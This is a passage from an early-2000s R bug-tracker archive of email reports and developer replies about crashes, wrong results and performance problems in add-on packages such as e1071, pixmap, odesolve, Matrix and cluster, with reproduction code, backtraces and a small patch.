Fri Nov 23 19:15:14 2001	ripley	moved from incoming to Add-ons

==> 1178.followup.3 <==
From jan@rychter.com  Fri Nov 23 21:02:25 2001
Received: from screech.rychter.com (screech.rychter.com [212.87.11.114])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA11852
	for <R-bugs@biostat.ku.dk>; Fri, 23 Nov 2001 21:02:25 +0100 (MET)
Received: from tnuctip.rychter.com (tnuctip-tun0.rychter.com [10.0.0.2])
	by screech.rychter.com (Postfix) with ESMTP
	id 2CE564A600; Fri, 23 Nov 2001 20:32:56 +0100 (CET)
Received: by tnuctip.rychter.com (Postfix, from userid 501)
	id C7BD569F24; Fri, 23 Nov 2001 21:02:42 +0100 (CET)
Sender: jan@rychter.com
From: Jan Rychter <jan@rychter.com>
To: David Meyer <david.meyer@ci.tuwien.ac.at>
Cc: jan@rychter.com, r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] segfault using svm from e1071 (PR#1178)
References: <200111202238.XAA07070@pubhealth.ku.dk>
	<3BFB838A.E7E40F39@ci.tuwien.ac.at>
X-Operating-System: Linux 2.4.12 #6 Mon Nov 12 12:22:25 CET 2001
X-No-Archive: yes
Date: Fri, 23 Nov 2001 21:02:41 +0100
In-Reply-To: <3BFB838A.E7E40F39@ci.tuwien.ac.at> (David Meyer's message of
 "Wed, 21 Nov 2001 11:35:55 +0100")
Message-ID: <m2oflt1cim.fsf@tnuctip.rychter.com>
Lines: 72
User-Agent: Gnus/5.090004 (Oort Gnus v0.04) XEmacs/21.4 (Artificial
 Intelligence, i386-mandrake-linux)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-2
Content-Transfer-Encoding: 8bit

>>>>> "David" == David Meyer <david.meyer@ci.tuwien.ac.at> writes:
 David> jan@rychter.com wrote:
 >>
 >> This could be a bug in the e1071 svm code, but maybe not -- I guess
 >> I'll send it here anyway. It's reproducible.

 David> Which version of e1071 are you using (Current: 1.2-1)? This
 David> package had a bug fix release one month ago.

To follow up on this (yes, I'm using 1.2-1), here is the backtrace. Hope
it helps.

> library(e1071)
>      x <- seq (0.1,5,by=0.05)
>      y <- log(x) + rnorm (x, sd=0.2)
>      m   <- svm (x,y)

Program received signal SIGSEGV, Segmentation fault.
0x4011ffe8 in realloc () from /lib/libc.so.6
(gdb) bt
#0  0x4011ffe8 in realloc () from /lib/libc.so.6
#1  0x403859ea in Cache::get_data (this=0x8b01d00, index=145759521, data=0xbfffd9b4, 
    len=99) at svm.cpp:126
#2  0x4038b239 in SVR_Q::get_Q (this=0xbfffdb00, i=100, len=198) at svm.cpp:1223
#3  0x4038658d in Solver::Solve (this=0xbfffdb50, l=198, Q=@0xbfffdb00, b_=0x8b01148, 
    y_=0x8b01780 '\001' <repeats 99 times>, 'ÿ' <repeats 99 times>, alpha_=0x8b00b10, 
    Cp=1, Cn=1, eps=0.001, si=0xbfffdc20, shrinking=1) at svm.cpp:534
#4  0x40388249 in solve_epsilon_svr (prob=0xbfffde40, param=0xbfffde50, alpha=0x8b007f0, 
    si=0xbfffdc20) at svm.cpp:1195
#5  0x40388aac in svm_train_one (prob=0xbfffde40, param=0xbfffde50, Cp=0, Cn=0)
    at svm.cpp:1505
#6  0x40388c54 in svm_train (prob=0xbfffde40, param=0xbfffde50) at svm.cpp:1584
#7  0x40384202 in svmtrain () from /local/lib/R/library/e1071/libs/e1071.so
#8  0x0808ccd9 in do_dotCode ()
#9  0x08093e23 in Rf_eval ()
#10 0x0809546a in do_set ()
#11 0x08093c6e in Rf_eval ()
#12 0x08094db9 in do_begin ()
#13 0x08093c6e in Rf_eval ()
#14 0x08094238 in Rf_applyClosure ()
#15 0x080b423b in applyMethod ()
#16 0x080b47ce in Rf_usemethod ()
#17 0x080b49dd in do_usemethod ()
#18 0x08093c6e in Rf_eval ()
#19 0x08094238 in Rf_applyClosure ()
#20 0x08093eaa in Rf_eval ()
#21 0x0809546a in do_set ()
#22 0x08093c6e in Rf_eval ()
#23 0x080a906b in R_ReplConsole ()
#24 0x080a980a in run_Rmainloop ()
#25 0x080ff8e8 in main ()
#26 0x400bb5b0 in __libc_start_main () from /lib/libc.so.6
(gdb) 


--Jan

 > x <- seq (0.1,5,by=0.05) y <- log(x) + rnorm (x, sd=0.2)
 > library(e1071) m <- svm (x,y)
 >>
 >> Process R segmentation fault at Tue Nov 20 23:34:19 2001
 >>
 > version
 >> _ platform i686-pc-linux-gnu arch i686 os linux-gnu system i686,
 >> linux-gnu status major 1 minor 3.1 year 2001 month 08 day 31
 >> language R
 >>
 >> I used the Mandrake 8.0 RPM binaries from cran.r-project.org first,
 >> then recompiled R myself and reinstalled e1071. Same results.
 >>
 >> thanks, --J.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1199 *
Subject: pixmap: infinite recursion with nonascii pnm-files
From: thomas.baumann@ch.tum.de
Date: Fri, 7 Dec 2001 11:07:52 +0100 (CET)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1199 <==
From postmaster@franz.stat.wisc.edu  Fri Dec  7 11:06:27 2001
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id LAA05422
	for <r-bugs@biostat.ku.dk>; Fri, 7 Dec 2001 11:06:27 +0100 (MET)
Received: from mafu.ws.chemie.tu-muenchen.de (really [129.187.76.2]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m16CHtb-000IinC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Fri, 7 Dec 2001 04:06:19 -0600 (CST) 
Received: from rc1021.ce.uiuc.edu (localhost [127.0.0.1])
	by mafu.ws.chemie.tu-muenchen.de (8.11.6/8.11.6/SuSE Linux 0.5) with ESMTP id fB7A7qT06891
	for <r-bugs@r-project.org>; Fri, 7 Dec 2001 11:07:52 +0100
Message-Id: <200112071007.fB7A7qT06891@mafu.ws.chemie.tu-muenchen.de>
Date: Fri, 7 Dec 2001 11:07:52 +0100 (CET)
From: thomas.baumann@ch.tum.de
Reply-To: thomas.baumann@ch.tum.de
Subject: pixmap: infinite recursion with nonascii pnm-files
To: r-bugs@r-project.org
MIME-Version: 1.0
Content-Type: TEXT/plain; charset=us-ascii

Problem:

read.pnm from pixmap_0.2-1.tar.gz stops with an infinite recursion if a
"#" occurs within the raw (binary) data of a pnm-file.


The reason for this behaviour seems to be the handling of comments in
read.pnmhead. The recursive call of strip.comments requires a newline to
complete sucessfully. A work-around would be

diff -r pixmap/R/pnm.R pixmap.orig/R/pnm.R
112c112
<       com1 <- as.integer(regexpr("#.*\n", inpstr))
---
>       com1 <- as.integer(regexpr("#", inpstr))

i.e. to check if the comment sign is actually followed by a newline.

However, if this sequence (#.*\n) would occur within the data and within
the first 350 bytes of the pnm-file the data would be stripped as well.

Furthermore, comments within the data of ascii files after byte 350 are
not handled correctly and lead to an error. Although this seems to be a
rare case, it might occur and it is allowed by the pnm-file
specification.

Thomas

--please do not edit the information below--

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status = 
 major = 1
 minor = 3.1
 year = 2001
 month = 08
 day = 31
 language = R

Search Path:
 .GlobalEnv, package:pixmap, package:ctest, Autoloads, package:base



==> 1199.audit <==
Mon Dec 10 08:20:14 2001	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1295 *
Subject:  typo and user-proofing in odesolve() 
From: Ben Bolker <bolker@zoo.ufl.edu>
Date: Fri, 1 Feb 2002 12:42:25 -0500
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1295 <==
From postmaster@franz.stat.wisc.edu  Fri Feb  1 18:34:34 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA21981
	for <r-bugs@biostat.ku.dk>; Fri, 1 Feb 2002 18:34:34 +0100 (MET)
Received: from triarch.zoo.ufl.edu (really [128.227.60.248]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m16WhZX-000Ic9C@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Fri, 1 Feb 2002 11:33:59 -0600 (CST) 
Received: from bolker.zoo.ufl.edu ([10.227.60.45]) by triarch.zoo.ufl.edu
          (Netscape Messaging Server 3.5)  with ESMTP id 394;
          Fri, 1 Feb 2002 12:33:54 -0500
Received: (from ben@localhost)
	by bolker.zoo.ufl.edu (8.11.0/8.11.0) id g11HgPO02553;
	Fri, 1 Feb 2002 12:42:25 -0500
Date: Fri, 1 Feb 2002 12:42:25 -0500
From: Ben Bolker <bolker@zoo.ufl.edu>
Message-Id: <200202011742.g11HgPO02553@bolker.zoo.ufl.edu>
To: r-bugs@r-project.org
Subject:  typo and user-proofing in odesolve() 
Cc: ben@bolker.zoo.ufl.edu


  A couple of minor points about the odesolve package
(which I am otherwise enjoying very much):

 1. "scalar" is misspelled as "scaler" in the definitions of
the rtol and atol parameters

 2. it is possible to crash R by doing something dumb, e.g
failing to read the documentation carefully enough and (a)
returning only a vector of derivatives and not a list of
(derivatives, global values) and (b) making the derivative
vector shorter than the vector of initial conditions (see example below).

  I know that this is my fault, but it might be possible/useful
to "user-proof" lsoda() some more (try func() once and see if
it returns a list of the appropriate form, check the derivative
vector for length matching the IC vector, etc ...

tderiv <- function(t,x,parms) {
#  return(list(c(x[1]*parms[1],x[2]*parms[2],parms[3]*(x[1]+x[2])),NULL))
   return(c(x[1]*parms[1],x[2]*parms[2],parms[3]*(x[1]+x[2])))
}

lsoda(rep(1,2),c(0:20),tderiv,c(0.01,-0.01,1.2))


--please do not edit the information below--

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status = 
 major = 1
 minor = 3.1
 year = 2001
 month = 08
 day = 31
 language = R

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base

==> 1295.audit <==
Fri Feb  1 21:55:34 2002	ripley	moved from incoming to Add-ons

==> 1295.followup.1 <==
From Setzer.Woodrow@epamail.epa.gov Mon Feb  4 14:56:19 2002
Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA08298
	for <R-bugs@biostat.ku.dk>; Mon, 4 Feb 2002 14:56:18 +0100 (MET)
From: Setzer.Woodrow@epamail.epa.gov
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id OAA06000
	for <r-bugs@lists.r-project.org>; Mon, 4 Feb 2002 14:55:42 +0100 (MET)
Received: from myrtle.rtpnc.epa.gov(134.67.208.33)
 via SMTP by hypatia, id smtpdAAAa001Th; Mon Feb  4 14:55:41 2002
Received: from epahub11.rtp.epa.gov (epahub11.rtp.epa.gov [134.67.213.52])
 by epamail.epa.gov (PMDF V5.2-32 #42055)
 with ESMTP id <0GR00080QHBVO8@epamail.epa.gov> for r-bugs@lists.r-project.org;
 Mon,  4 Feb 2002 08:55:09 -0500 (EST)
Date: Mon, 04 Feb 2002 08:55:15 -0500
Subject: Re: [Rd] typo and user-proofing in odesolve() (PR#1295)
To: r-bugs@hypatia.math.ethz.ch
Message-id: <OFDD76742E.7FE9E11E-ON85256B56.004C563F@rtp.epa.gov>
MIME-version: 1.0
X-Mailer: Lotus Notes Release 5.0.7  March 21, 2001
Content-type: text/plain; charset=us-ascii
X-MIMETrack: Serialize by Router on EPAHUB11/USEPA/US(Release 5.0.6a |January
 17, 2001) at 02/04/2002 08:55:17 AM
Content-Length: 4860
Status: RO

Forward to r-bugs to maintain a record.

R. Woodrow Setzer, Jr.                                            Phone:
(919) 541-0128
Experimental Toxicology Division                       Fax:  (919)
541-5394
Pharmacokinetics Branch
NHEERL MD-74; US EPA; RTP, NC 27711
----- Forwarded by Woodrow Setzer/RTP/USEPA/US on 02/04/02 08:53 AM
-----
                                                                                                                      
                    Woodrow Setzer                                                                                    
                                         To:     bolker@zoo.ufl.edu                                                   
                    02/01/02 03:23       cc:     owner-r-devel@stat.math.ethz.ch                                      
                    PM                   Subject:     Re: [Rd] typo and user-proofing in odesolve() (PR#1295)         
                                         (Document link: Woody Setzer)                                                
                                                                                                                      



Probably r-devel is not the right place for this discussion, since
odesolve is not an "official" part of R (not even a recommended
package).  I'll respond here to get it in the record, though.  I expect
to have a new release of odesolve ready in a couple of weeks.  lsoda
already calls func() once, to determine the number of "extra" values
returned; it was foolish of me not to test for the kind of value
returned at the same time.  That fix is already in the next release.
I'll see what other defensive checking can be done, as well.
Thanks for the spelling correction.

R. Woodrow Setzer, Jr.                                            Phone:
(919) 541-0128
Experimental Toxicology Division                       Fax:  (919)
541-5394
Pharmacokinetics Branch
NHEERL MD-74; US EPA; RTP, NC 27711


                                                                                                                              
                    bolker@zoo.ufl.edu                                                                                        
                    Sent by:                     To:     r-devel@stat.math.ethz.ch                                            
                    owner-r-devel@stat.ma        cc:                                                                          
                    th.ethz.ch                   Subject:     [Rd] typo and user-proofing in odesolve() (PR#1295)             
                                                                                                                              
                                                                                                                              
                    02/01/02 12:34 PM                                                                                         
                                                                                                                              
                                                                                                                              





  A couple of minor points about the odesolve package
(which I am otherwise enjoying very much):

 1. "scalar" is misspelled as "scaler" in the definitions of
the rtol and atol parameters

 2. it is possible to crash R by doing something dumb, e.g
failing to read the documentation carefully enough and (a)
returning only a vector of derivatives and not a list of
(derivatives, global values) and (b) making the derivative
vector shorter than the vector of initial conditions (see example
below).

  I know that this is my fault, but it might be possible/useful
to "user-proof" lsoda() some more (try func() once and see if
it returns a list of the appropriate form, check the derivative
vector for length matching the IC vector, etc ...

tderiv <- function(t,x,parms) {
#  return(list(c(x[1]*parms[1],x[2]*parms[2],parms[3]*(x[1]
+x[2])),NULL))
   return(c(x[1]*parms[1],x[2]*parms[2],parms[3]*(x[1]+x[2])))
}

lsoda(rep(1,2),c(0:20),tderiv,c(0.01,-0.01,1.2))


--please do not edit the information below--

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status =
 major = 1
 minor = 3.1
 year = 2001
 month = 08
 day = 31
 language = R

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base

-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.
-.-.-.-
r-devel mailing list -- Read
http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
Send "info", "help", or "[un]subscribe"
(in the "body", not the subject !)  To:
r-devel-request@stat.math.ethz.ch
_._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._.
_._._._






~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1361 *
Subject: Matrix identification bug
From: hyu@stats.uwo.ca
Date: Tue, 5 Mar 2002 21:19:46 +0100 (MET)
--seems to be about Matrix package, not solve
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1361 <==
From hyu@stats.uwo.ca  Tue Mar  5 21:19:46 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id VAA08030
	for <R-bugs@biostat.ku.dk>; Tue, 5 Mar 2002 21:19:46 +0100 (MET)
Date: Tue, 5 Mar 2002 21:19:46 +0100 (MET)
From: hyu@stats.uwo.ca
Message-Id: <200203052019.VAA08030@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: Matrix identification bug

Full_Name: Hao Yu
Version: 1.4.1
OS: Windws and Linux
Submission from: (NULL) (129.100.45.161)


Hi,
   Recently we did some benchmarks regarding matrix inverse operation and found
some strange things. See the following results (the package Matrix is most
updated).

1. load the function Toeplitz and library(Matrix)
"Toeplitz"
function(x)
{
        matrix(x[1 + abs(outer(seq(along = x), seq(along = x), FUN = "-"))], 
                byrow = T, ncol = length(x))
}
2. On a PIII 1.125GHz (256kb cache)desktop PC with win2k, the results are
> system.time(solve(Toeplitz(.5^seq(0,999))))
[1] 38.25  0.22 42.01    NA    NA
> system.time(solve.Matrix(Toeplitz(.5^seq(0,999))))
[1] 28.01  0.17 30.94    NA    NA

On a PIII-M 1.2GHz (512kb cache) laptop PC with winxp pro, the results are
> system.time(solve(Toeplitz(.5^seq(0,999))))
[1] 33.94  0.25 34.01    NA    NA
> system.time(solve.Matrix(Toeplitz(.5^seq(0,999))))
[1] 9.40  0.13 9.54    NA    NA

On a PIII Xeon 1GHz (256kb cache) RedHat 7.2 Linux, the results are
> system.time(solve(Toeplitz(.5^seq(0,999))))
[1] 53.79  0.48 00.01    NA    NA
> system.time(solve.Matrix(Toeplitz(.5^seq(0,999))))
[1] 30.29  0.21 30.59    NA    NA

This was the first time that windows R outperformed linux R even PIII Xeon 1GHz
is slightly faster than PIII 1.125GHz. Notice the abnormal result 9.4s from
PIII-M 1.2GHz (cannot be three times faster). After using native fortran lapack
(call to dpotrf and dpotri returns 9s for PIII Xeon), I realized that R may
treat the matrix as a general matrix rather than symmetric except the abnormal
case.  To confirm this, I modified the R_LapackPP.cc in Matrix package and it
turned out that
    is.MMatrix() failed to return true.
Hence 
        if (checkClass(classes, "Hermitian")) 
            return new LaSymmMatDouble(x);
is not executed in static LaMatDouble* asLaMatrix(SEXP x). Instead
    if (isMatrix(x)) {
            return new LaGenMatDouble(x);  
        }
is used. 
After replaced
    return new LaGenMatDouble(x);   
with 
    return new LaSymmMatDouble(x);

the result was (PIII Xeon 1GHz RedHat 7.2 Linux))
> system.time(solve.Matrix(Toeplitz(.5^seq(0,999))))
[1] 9.76 0.22 9.97 0.00 0.00

Clearly there are some bugs in solve() and solve.Matrix(). Notice that all have
> is.Hermitian(Toeplitz(.5^seq(0,999)))
[1] TRUE


Thanks 
Hao Yu


==> 1361.followup.1 <==
From ripley@stats.ox.ac.uk  Tue Mar  5 22:32:30 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA08212
	for <R-bugs@biostat.ku.dk>; Tue, 5 Mar 2002 22:32:30 +0100 (MET)
Received: from tern.stats (pc2-oxfo4-0-cust120.oxf.cable.ntl.com [62.254.131.120])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id VAA24644;
	Tue, 5 Mar 2002 21:31:57 GMT
Date: Tue, 5 Mar 2002 21:32:31 +0000 (GMT Standard Time)
From: Prof Brian D Ripley <ripley@stats.ox.ac.uk>
To: hyu@stats.uwo.ca
cc: R-bugs@biostat.ku.dk
Subject: Re: [Rd] Matrix identification bug (PR#1361)
In-Reply-To: <200203052019.VAA08035@pubhealth.ku.dk>
Message-ID: <Pine.WNT.4.44.0203052125210.1136-100000@tern.stats>
Sender: ripley@stats.ox.ac.uk
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Tue, 5 Mar 2002 hyu@stats.uwo.ca wrote:

> Full_Name: Hao Yu
> Version: 1.4.1
> OS: Windws and Linux
> Submission from: (NULL) (129.100.45.161)

[...]

> the result was (PIII Xeon 1GHz RedHat 7.2 Linux))
> > system.time(solve.Matrix(Toeplitz(.5^seq(0,999))))
> [1] 9.76 0.22 9.97 0.00 0.00
>
> Clearly there are some bugs in solve() and solve.Matrix(). Notice that all have

Nothing in this report suggests a bug in solve().  Can you please provide
some evidence for your claim (which is not `clear' to me), and

> solve
function (a, b, ...)
UseMethod("solve")

seems hard to get wrong!  (It matters: solve is part of R: solve.Matrix is
a contributed addon.)

Incidentally, these sort of timings are crucially dependent on the BLAS
library used, and in my experience that is a far larger factor that the OS
used.  However, that was not part of the report ....

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1361.audit <==
Thu Mar  7 12:41:18 2002	ripley	changed notes
Thu Mar  7 12:41:18 2002	ripley	foobar
Thu Mar  7 12:41:18 2002	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1580 *
Subject: R bug in cluster package
From: David Hitchcock <dhitchco@stat.ufl.edu>
Date: Mon, 20 May 2002 14:33:24 -0400
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1580 <==
From dhitchco@stat.ufl.edu  Mon May 20 20:34:12 2002
Received: from stat.ufl.edu (minke.stat.ufl.edu [128.227.141.32])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA29302
	for <r-bugs@biostat.ku.dk>; Mon, 20 May 2002 20:34:10 +0200 (MET DST)
Received: from stat.ufl.edu (albacore [128.227.141.64])
	by stat.ufl.edu (8.9.1/8.9.1/daw) with ESMTP id OAA22830
	for <r-bugs@biostat.ku.dk>; Mon, 20 May 2002 14:33:28 -0400 (EDT)
Sender: dhitchco@stat.ufl.edu
Message-ID: <3CE94173.AE7C8BA3@stat.ufl.edu>
Date: Mon, 20 May 2002 14:33:24 -0400
From: David Hitchcock <dhitchco@stat.ufl.edu>
Organization: University of Florida, Dept. of Statistics
X-Mailer: Mozilla 4.7 [en] (X11; U; SunOS 5.6 sun4u)
X-Accept-Language: en
MIME-Version: 1.0
To: r-bugs@biostat.ku.dk
Subject: R bug in cluster package
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

I have apparently found an error in the "pam" function of the "cluster"
library package.  Please pardon me if this error has been pointed out or
if this e-mail should be directed to someone else.

The problem only started occurring with R version 1.5.0, which I started
using about a week ago.  The problem occurs when you try to use "pam"
with the input being a dissimilarity matrix instead of a data matrix;
the results when using the dissimilarity matrix are very strange and not
at all like those obtained when using the data matrix.

For example, try this code:

library(cluster)
data(ruspini)
#the clustering using a data matrix as the input:
pam(ruspini,4)
#the clustering using a dissimilarity matrix as input:
pam(daisy(ruspini),4,diss=T)

The clustering results should be the same but are wildly different.
Again, this problem started happening with the upgrade to R 1.5.0.
Thank you for any help you can provide.

David Hitchcock


==> 1580.reply.1 <==
From maechler@stat.math.ethz.ch  Tue May 21 10:21:35 2002
Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id KAA02489
	for <R-bugs@biostat.ku.dk>; Tue, 21 May 2002 10:21:35 +0200 (MET DST)
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id KAA13318;
	Tue, 21 May 2002 10:20:41 +0200 (MET DST)
Received: from lynne(129.132.58.30), claiming to be "lynne.ethz.ch"
 via SMTP by hypatia, id smtpdAAAa003ER; Tue May 21 10:20:32 2002
Received: (from maechler@localhost)
	by lynne.ethz.ch (8.11.6/8.11.2) id g4L8Ki305936;
	Tue, 21 May 2002 10:20:44 +0200
From: Martin Maechler <maechler@stat.math.ethz.ch>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15594.859.952610.109917@gargle.gargle.HOWL>
Date: Tue, 21 May 2002 10:20:43 +0200
To: dhitchco@stat.ufl.edu
Cc: R-bugs@biostat.ku.dk
Subject: Re: [Rd] R bug in cluster package (PR#1580)
In-Reply-To: <200205201834.UAA29307@pubhealth.ku.dk>
References: <200205201834.UAA29307@pubhealth.ku.dk>
X-Mailer: VM 7.05 under Emacs 21.2.1
Reply-To: Martin Maechler <maechler@stat.math.ethz.ch>

>>>>> "DavidH" == David Hitchcock <dhitchco@stat.ufl.edu> writes:

    DavidH> I have apparently found an error in the "pam"
    DavidH> function of the "cluster" library package.  Please
    DavidH> pardon me if this error has been pointed out or if
    DavidH> this e-mail should be directed to someone else.

    DavidH> The problem only started occurring with R version
    DavidH> 1.5.0, which I started using about a week ago.  The
    DavidH> problem occurs when you try to use "pam" with the
    DavidH> input being a dissimilarity matrix instead of a data
    DavidH> matrix; the results when using the dissimilarity
    DavidH> matrix are very strange and not at all like those
    DavidH> obtained when using the data matrix.

    DavidH> For example, try this code:

     library(cluster)
     data(ruspini)
     ## the clustering using a data matrix as the input:
     pam(ruspini,4)
     ## the clustering using a dissimilarity matrix as input:
     pam(daisy(ruspini),4,diss=T)

    DavidH> The clustering results should be the same but are wildly different.

well, "wildly different" is an  ``unusual''  description of

   > daisy(ruspini)
   Error in daisy(ruspini) : NAs in foreign function call (arg 7)

which does happen when  library(methods)  is attached (as it is
for me)  
and  is not new in 1.5.0, (it does happen in the 1.4.x versions
as well, because since then, read.table() does not coerce
integer to numeric anymore).

This is clearly an omission in daisy() which only checks for "numeric"
instead of "integer" as well.

Can you make sure you detach methods, e.g., by

    if(any(i.meth <- search() == "package:methods")) detach(i.meth)

and retry then. For me the result is then almost identical
(apart from the fact that in the 2nd case the medoid coordinates are
 not available, of course!)

    DavidH> Again, this problem started happening with the upgrade to R 1.5.0.

(but not from 1.4.x ...)

    DavidH> David Hitchcock

Thanks for reporting.

==> 1580.audit <==
Wed Jun 12 17:36:35 2002	ripley	moved from incoming to Add-ons
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1662 *
Subject: fisher.test FEXACT memory bug "should not occur"
From: Martin Maechler <maechler@stat.math.ethz.ch>
Date: Thu, 13 Jun 2002 08:21:50 +0200
--The supplementary (table of sum one) is fixed for 1.5.1.
--Detection code for the first problem has been added to 1.5.1 which will stop
--the crash, but the underlying cause is still open.
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1662 <==
From maechler@stat.math.ethz.ch  Thu Jun 13 08:22:43 2002
Received: from stat.math.ethz.ch (daemon@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id IAA16033
	for <R-bugs@biostat.ku.dk>; Thu, 13 Jun 2002 08:22:42 +0200 (MET DST)
Received: (from daemon@localhost)
	by stat.math.ethz.ch (8.9.1/8.9.1) id IAA01485
	for <r-bugs@hypatia>; Thu, 13 Jun 2002 08:21:35 +0200 (MET DST)
Received: from lynne(129.132.58.30), claiming to be "lynne.ethz.ch"
 via SMTP by hypatia, id smtpdAAAa000Jg; Thu Jun 13 08:21:26 2002
Received: (from maechler@localhost)
	by lynne.ethz.ch (8.11.6/8.11.2) id g5D6LoC13482;
	Thu, 13 Jun 2002 08:21:50 +0200
X-Authentication-Warning: lynne.ethz.ch: maechler set sender to maechler@stat.math.ethz.ch using -f
From: Martin Maechler <maechler@stat.math.ethz.ch>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15624.14846.214663.363944@gargle.gargle.HOWL>
Date: Thu, 13 Jun 2002 08:21:50 +0200
To: R-bugs@stat.math.ethz.ch
Subject: fisher.test FEXACT memory bug "should not occur"
X-Mailer: VM 7.07 under Emacs 20.7.1
Reply-To: Martin Maechler <maechler@stat.math.ethz.ch>

This is a bad bug as reported by Robin Hankin,
it is still in "R-patched" ...

##- From: Robin Hankin <r.hankin@auckland.ac.nz>
##- To: r-help@stat.math.ethz.ch
##- Subject: [R] possum sleeping: thanks and fisher.test() FEXACT error
##- Date: Thu, 13 Jun 2002 16:46:26 +1200

## .....

## Example slighlty modified (MM)

d4 <- matrix(c(0, 0, 0, 0, 0,  0, 3, 0, 1, 0,  0, 0, 0, 0, 0,
               1, 0, 0, 0, 0,  1, 0, 0, 2, 0,  0, 0, 1, 0, 0,
               0, 1, 0, 1, 0,  4, 0, 2, 0, 0,  0, 1, 0, 0, 0,  0, 0, 0, 0, 0,
               0, 1, 0, 0, 2,  0, 0, 0, 2, 2,  0, 1, 0, 0, 0,
               0, 0, 1, 1, 0,  0, 0, 0, 0, 0,  0, 1, 0, 0, 0,
               1, 0, 0, 0, 2,  0, 0, 0, 3, 0,  0, 0, 0, 0, 1,  0, 0, 0, 0, 0,
               2, 0, 0, 0, 0,  0, 0, 0, 0, 0,  0, 0, 1, 0, 1,
               0, 0, 0, 0, 2,  0, 0, 0, 0, 8,  0, 0, 0, 3, 0,
               0, 0, 0, 0, 0,  0, 0, 0, 0, 0,  0, 0, 0, 0, 0,  0, 0, 0, 0, 1,
               0, 0, 1, 0, 0,  0, 0, 0, 0, 0,  2, 0, 0, 1, 0,
               0, 2, 0, 0, 0,  0, 2, 0, 0, 1,  3, 0, 0, 0, 0,
               0, 0, 0, 0, 0,  0, 0, 0, 0, 1,  0, 0, 1, 0, 0,  4, 0, 0, 0, 0),
             nr=50)

fisher.test(d4)
##- Error in fisher.test(alldata[, 2:5]) : FEXACT error 30.
##- Stack length exceeded in f3xact.
##- This problem should not occur.


==> 1662.followup.1 <==
From ligges@amadeus.statistik.uni-dortmund.de  Thu Jun 13 08:58:58 2002
Received: from nx5.HRZ.Uni-Dortmund.DE (nx5.HRZ.Uni-Dortmund.DE [129.217.131.21])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id IAA16332
	for <R-bugs@biostat.ku.dk>; Thu, 13 Jun 2002 08:58:57 +0200 (MET DST)
Received: from amadeus.statistik.uni-dortmund.de by nx5.HRZ.Uni-Dortmund.DE
          via smtp-local with ESMTP; Thu, 13 Jun 2002 08:56:18 +0200
Received: from statistik.uni-dortmund.de ([129.217.207.201])
	by amadeus.statistik.uni-dortmund.de (8.11.6+Sun/8.11.6) with ESMTP id g5D6uH708478;
